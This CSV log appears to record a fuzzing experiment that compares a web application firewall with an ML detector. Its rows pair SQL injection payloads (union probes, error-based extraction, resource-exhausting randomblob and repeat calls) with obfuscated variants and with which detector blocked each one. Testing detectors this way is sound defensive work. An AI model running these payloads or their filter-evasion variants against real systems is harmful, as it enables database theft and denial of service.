Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T15:12:16.914376,7728,200,200,200,both_correct,0x1e30,2024-12-16T15:12:17.248125,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:18.630162,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:20.029404,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:21.463236,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:22.855729,200,403,waf_correct_ml_incorrect
12,2024-12-16T15:12:24.274237,"select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"SElecT * FrOM generate_series	 (  3607,''<>'c',CaSE wHen   ( /**/3607   lIKE   4242  )   ThEn (seLECT 1) ElSe 0 end  )   limit 0x1--",2024-12-16T15:12:29.438808,200,200,both_incorrect,"SeleCT * FRoM generate_series	 (  295<>296,'' NOT LIKE 'c',caSE whEN   (  3607   LiKe   0x1092  ) 	 THeN (sELeCt (SELECT 1)) ELSE 0 end  )   limit 0x1--",2024-12-16T15:12:36.851936,200,403,waf_incorrect_ml_correct,"Select/**/* frOM generate_series	 (  295<>296,'' NOT LIKE 'c',cAse WhEN   (  3607   like   0x1092 	) 	 tHen (sELeCT (sELect 1)) elSE (SELECt 6958!= || 0) End  )   limit 0x1--",2024-12-16T15:12:45.436053,200,403,waf_incorrect_ml_correct,"sELect * frOM generate_series	 (  295<>296,'' not like 'c',CasE wHEN	  (  (SElECT 1)   LIKe   0x1092 	) 	 ThEn (SelecT (SELEct 1)) else (SElEcT '>.' NOT LIKE '>.8'!= || (selecT 0)) END  )   limit 0x1--",2024-12-16T15:12:54.657724,403,403,both_correct,"SELECt * frOm generate_series	 (  3103 NOT LIKE 3104<>296,'' not like 'c',CAsE wHen	  (  (seLECt 1)   lIke   0x1092 	)/**/	 THeN (seLect (SELEcT 1)) Else (seleCt '>.' NOT LIKE '>.8'<> || (seLEct (SelEct  OR	0))) eNd  )   limit 0x1--",2024-12-16T15:13:05.214532,403,403,both_correct
13,2024-12-16T15:13:17.481463,tejo,200,200,200,both_correct,tejo,2024-12-16T15:13:17.807344,200,200,both_correct,tejo,2024-12-16T15:13:19.103188,200,200,both_correct,tejo,2024-12-16T15:13:20.409413,200,200,both_correct,tejo,2024-12-16T15:13:21.730408,200,200,both_correct,tejo,2024-12-16T15:13:23.033202,200,200,both_correct
14,2024-12-16T15:13:24.355501,1'   )    )    as cimd where 9608  =  9608,403,403,200,waf_correct_ml_incorrect," && 1'   )    )    aS cimd WhErE 8569 in (8568,8569,8570)/*0x3*/	=  9608",2024-12-16T15:13:26.446058,403,403,both_correct," && 0x1'  /**/)    )	   AS cimd whErE 8569 iN ((SELECT 1),8569,8570)/*BZ]Oo*/	=  6233 NOT LIKE 6234",2024-12-16T15:13:30.819047,403,403,both_correct," && 0x1'  /**/)    )
/**/  AS cimd WhEre (SELECT 127<>128) IN ((SELecT 1),8569,8570)/*7*/	=  (SELECT 6233) not like 6234",2024-12-16T15:13:36.534810,403,403,both_correct,"  AND  0x1'  /**/)    )
   As cimd WHEre (SELect (SELECT ']'!=']F')<>128) In ((Select 1),8569,8570)/*7*/
=  (SeleCT 0x1859) not like 6234",2024-12-16T15:13:43.325493,403,403,both_correct,"  AnD  0x1' /**//**/)    )
   As cimd WHEre (SELect (SELECT ']'!=']F')<>128) IN ((sELecT 1),(SELECT 8569),8570)/**/ =  (SelECt 0x1859) not like  || 0",2024-12-16T15:13:50.596409,403,403,both_correct
15,2024-12-16T15:13:58.517251,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",403,403,403,both_correct,"7421 iN (7420,7421,7422)"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    ) /**/ x from   (  select 8488 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm""	like ""cgpm",2024-12-16T15:14:13.419573,403,403,both_correct,"7421 IN (7420,3231 LIKE 3231,7422)"" or row  (  1045,(SELECT 7562)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2  /**/)    ) /**/ x from  
(  select  AND 1 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm""	like ""cgpm",2024-12-16T15:14:30.542735,403,403,both_correct,"7421 IN (7420,3231 liKe 3231, and 1)"" or row  (  1045,(SELECT 7562)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/1 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",2024-12-16T15:14:48.489504,403,403,both_correct,"7421 in (7420,3231 like 3231, And 1)"" or row  (  (SELECT 1),(SELECT 7562)	 )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )  /*v
*/  )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/(SELECT 1) union select 5584 union select  AND 'd-El'<>'d-Elx' union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",2024-12-16T15:15:07.748883,403,403,both_correct,"7421 In (7420,3231 like 908!=909, and 1)"" or row  (  (SELECT 1),(SELECT 7562)	 )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )  /**/  )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/(SELECT 0x1) union/**/select (SELECT 1) union select  AND 'd-El'<>'d-Elx' union select 1210  )  a group by x 
)   and ""cgpm"" like ""cgpm`",2024-12-16T15:15:28.284920,403,403,both_correct
16,2024-12-16T15:15:49.430219,"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",403,403,403,both_correct,"(SELECT  AND 6889 NOT LIKE 6890)' /**/ )    )     )   union
all sElECT null,null,null,null,null,null,null,null#@",2024-12-16T15:15:53.091603,403,403,both_correct,"(sELect  And '5}'<>'(SELECT 1)}v' not like 0x1aea)' /**/ )    )     )   union all/**/SeLECT null,null,null,null,null,null,null,null#@L",2024-12-16T15:15:59.426075,403,403,both_correct,"(seLecT  AnD '(SELECT 5)}' not like '(SELECT  AND 9261!=9262)}v' not like 0x1aea)' /*T*/ )    )     )   union all sELect
null,null,null,null,null,null,null,null#@L",2024-12-16T15:16:06.956655,403,403,both_correct,"(SELECT  AnD '(SELECT
5)}' not like '(SELECT  AND  OR 0!=7897!=0x242e)}v' not like/**/0x1aea)' /**/ )    )     )   union all sElecT
null,null,null,null,null,null,null,null#@LX",2024-12-16T15:16:15.623762,403,403,both_correct,"(seLect  aND '(SELECT	 OR 0)}' not like '(SELECT  AND  OR 0!=(SELECT 9827<>9828)!=0x242e)}v' not like/**/0x1aea)'   )    )     )   union all SelEct
null,null,null,null,null,null,null,null#@LX",2024-12-16T15:16:24.850970,403,403,both_correct
17,2024-12-16T15:16:35.033358,tyler,200,200,200,both_correct,tyler,2024-12-16T15:16:35.397636,200,200,both_correct,tyler,2024-12-16T15:16:36.750662,200,200,both_correct,tyler,2024-12-16T15:16:38.119193,200,200,both_correct,tyler,2024-12-16T15:16:39.469418,200,200,both_correct,tyler,2024-12-16T15:16:40.839826,200,200,both_correct
18,2024-12-16T15:16:42.201543,1'||  (  select 'yzdz' where 5021  =  5021,403,403,403,both_correct,"0x1'||/*
)*/ (  select	'yzdz' WherE 'AU'='AU'   like    AND 1",2024-12-16T15:16:44.303594,403,403,both_correct,"0x1'||/*
)*/ (  select
'yzdz'/**/WherE (SELECT (SELECT 1))   LIKe    aND '=lEw_' LIKE ' LIKE lEw_'",2024-12-16T15:16:48.265885,403,403,both_correct,"0x1'||/*	)*/ (  select
'yzdz'/**/WherE (SELECT (SELECT  AND 'u@' LIKE 'u@'))   LIKe   /**/aND ' LIKE lEw_' LIKE ' LIKe lEw_'",2024-12-16T15:16:53.923361,403,403,both_correct,"0x1'||/*	)*/ (  select
'yzdz'/**/WherE
(SELECT (SELECT  AND 'CUQ-' NOT LIKE 'CUQ-{'))   LIKe  /**//**/aND ' LIke lEw_' LIKE ' Like lEw_'",2024-12-16T15:17:00.834030,403,403,both_correct,"0x1'||/*
)*/ (  select
'yzdz' WherE
(SELECT (SELECT  AND 'CUQ-' NOT LIKE 'CUQ-{'))   LIKe  /**//**/aND ' Like lEw_' LIKE ' lIKE lEw_'",2024-12-16T15:17:08.457524,403,403,both_correct
19,2024-12-16T15:17:15.737609,"1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",403,403,200,waf_correct_ml_incorrect,"0x1%'  )  	or 'Y%'<>'Y%d'/*r@;M*/ =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/ AND 1   )    )      )    )   --",2024-12-16T15:17:20.873048,403,200,waf_correct_ml_incorrect,"0x1%'  )   or 'Y%'<>'Y%d'/*^*/ =  like  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  'b3'!='b3~'/ And  Or 0x0   )    )      )    )   --",2024-12-16T15:17:28.133259,403,200,waf_correct_ml_incorrect,"0x1%'  )   or
'Y%'<>'Y%d'/**/ =  like  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  'b3'!='b3~'/ AnD  or 0x0   )    )      )    )  /**/--",2024-12-16T15:17:35.772127,403,200,waf_correct_ml_incorrect,"0x1%'  )   or	'Y%'<>'Y%d'  =  like  (  'abcdefg',upper  ( /*)~*/hex  (  randomblob  (  'b3'!='b3~'/ aNd  oR 0x0   )    )      )    )  /**/--",2024-12-16T15:17:43.423390,403,200,waf_correct_ml_incorrect,"0x1%'  )   or
'Y%'<>'Y%d'  =  like  (  'abcdefg',upper  ( /*)~*/hex  ( /*.1w*/randomblob  (  'b3'!='b3~'/ And  oR 0x0   )    )      )    )  /**/--",2024-12-16T15:17:51.043656,403,200,waf_correct_ml_incorrect
20,2024-12-16T15:17:59.039262,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",403,200,200,both_incorrect,"call regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  char/*VD1#*/ (  9754!=9755  )  ||char  (  69 	)  ||char  (  83  )  ,null  )  ,0x0  )  ,500000000  )  ,null  )   aND   (   AnD 1   LiKE   8503",2024-12-16T15:18:07.180913,200,200,both_incorrect,"call regexp_substring  (  repeat  (  LefT  (  crypt_key  (  char/*VD1#*/ (  9754!=9755  )  ||char  (  69 	)  ||char  (   && 'b'!='bn'  )  ,null  )  ,0x0  )  ,500000000/**/ )  ,null	 )   And   (   AnD (SELECT 1)   LIke   8503%b",2024-12-16T15:18:17.544456,200,200,both_incorrect,"call regexp_substring  (  repeat  (  lEft  (  crypt_key/**/ (  char/**/ (  '`1&4w' LIKE '`1&4w'!=9755  )  ||char  (  0x45 	)  ||char  (    AND  'b'!='bn'  )  ,null  )  ,0x0  )  , AND 1/*mow|Q*/ )  ,null
 )   anD   (   and (SELECT 1)   LIkE   8503%b",2024-12-16T15:18:29.502069,200,200,both_incorrect,"call regexp_substring  (  repeat /**/(  LefT  (  crypt_key/**/ (  char/*""?FqJ*/ (  '`1&4w' lIke '`1&4w'!=(SELECT 9755)  )  ||char  (  0x45 
)   oR char  (    anD  'b'!='bn'  )  ,null  )  ,0x0  )  , and  AND 1/*mow|Q*/ )  ,null
 )   And   (   aNd (SeLecT 3394=3394)   lIKe   8503%b",2024-12-16T15:18:42.044611,200,200,both_incorrect,"call regexp_substring  (/**/ repeat /**/(  LEfT  (  crypt_key/**/ (  char/*""?FqJ*/ (  '`1&4w' LIKe '`1&4w'!=(SelEct 9755)  )   oR char  (  0x45  )   OR char  (    ANd  'b'!='bn'  )  ,null  )  ,0x0  )  , And  aNd (seLeCT (selEct 1))/*mow|Q*/ )  ,null
 )   aND   (   ANd (sELecT '!'!='!V'=3394)   LiKE   8503%b",2024-12-16T15:18:56.361792,403,200,waf_correct_ml_incorrect
